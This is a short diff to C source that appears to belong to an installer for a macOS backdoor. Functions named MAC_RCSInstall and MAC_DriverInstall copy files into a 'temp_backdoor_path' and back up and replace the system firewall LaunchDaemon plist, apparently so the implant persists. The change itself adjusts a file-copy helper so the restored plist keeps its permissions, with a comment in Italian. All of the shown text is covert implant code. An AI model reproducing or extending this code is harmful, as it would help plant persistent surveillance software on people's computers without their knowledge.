@@ -55,7 +55,7 @@ char _mdworker_content[]=	"<?xml version=\"1.0\" encoding=\"UTF-8\"?>"
 							"</plist>";
 
 #define BUFFER_SIZE 10000
-BOOL SafeCopyFile(WCHAR *source_path, WCHAR *dest_path)
+BOOL SafeCopyFile(WCHAR *source_path, WCHAR *dest_path, BOOL destMustExist)
 {
 	BYTE *buffer;
 	HANDLE hs, hd; 
@@ -71,7 +71,10 @@ BOOL SafeCopyFile(WCHAR *source_path, WCHAR *dest_path)
 		return FALSE;
 	}
 
-	hd = CreateFile(dest_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
+	if (destMustExist) 
+		hd = CreateFile(dest_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, OPEN_EXISTING, NULL, NULL);
+	else
+		hd = CreateFile(dest_path, GENERIC_WRITE, FILE_SHARE_READ, NULL, CREATE_ALWAYS, NULL, NULL);
 	if (hd == INVALID_HANDLE_VALUE) {
 		CloseHandle(hs);
 		SAFE_FREE(buffer);
@@ -163,7 +166,7 @@ BOOL MAC_RCSInstall(rcs_struct_t *rcs_info, users_struct_t *user_info, os_struct
 			swprintf_s(tmp_path2, MAX_PATH, L"%s\\%s", temp_backdoor_path, file_info.cFileName);
 			
 			ClearAttributes(tmp_path2);
-			if (!SafeCopyFile(tmp_path, tmp_path2)) {
+			if (!SafeCopyFile(tmp_path, tmp_path2, FALSE)) {
 				FindClose(hFind);
 				return FALSE;
 			}
@@ -252,7 +255,7 @@ BOOL MAC_DriverInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_struc
 	swprintf_s(plist_path, MAX_PATH, L"%sSystem\\Library\\LaunchDaemons\\com.apple.alf.agent.plist", os_info->drive);
 	hfile = CreateFile(plist_path_bu, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE, NULL, OPEN_EXISTING, NULL, NULL);
 	if (hfile == INVALID_HANDLE_VALUE) 
-		SafeCopyFile(plist_path, plist_path_bu);
+		SafeCopyFile(plist_path, plist_path_bu, FALSE);
 	else 
 		CloseHandle(hfile);
 
@@ -290,7 +293,7 @@ BOOL MAC_DriverUnInstall(os_struct_t *os_info, rcs_struct_t *rcs_info, users_str
 	if (i==0) {
 		swprintf_s(plist_path_bu, MAX_PATH, L"%sLibrary\\Preferences\\com.apple.alf.agent.plist", os_info->drive);
 		swprintf_s(plist_path, MAX_PATH, L"%sSystem\\Library\\LaunchDaemons\\com.apple.alf.agent.plist", os_info->drive);
-		SafeCopyFile(plist_path_bu, plist_path);
+		SafeCopyFile(plist_path_bu, plist_path, TRUE); // Apre la destinazione con OPEN_EXISTING per mantenere i permessi del file
 		DeleteFile(plist_path_bu);
 	}
 
